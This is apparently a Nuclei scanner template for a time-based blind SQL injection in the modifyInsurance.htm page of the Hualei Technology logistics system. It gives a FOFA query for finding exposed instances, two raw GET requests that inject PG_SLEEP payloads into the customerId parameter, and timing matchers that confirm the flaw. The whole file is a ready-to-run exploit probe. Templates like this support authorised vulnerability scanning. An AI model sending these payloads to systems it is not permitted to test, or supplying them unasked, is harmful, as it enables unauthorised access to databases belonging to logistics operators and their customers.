id: hualei-logistics-modifyinsurance-sql
info:
  name: "华磊科技物流系统 modifyInsurance 组件 SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: FOFA：body="l_c_bar"
  tags: 华磊科技物流系统
http:
- raw:
  - |
    GET /modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP(5)) HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP(8)) HTTP/1.1
    Host: {{Hostname}}
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
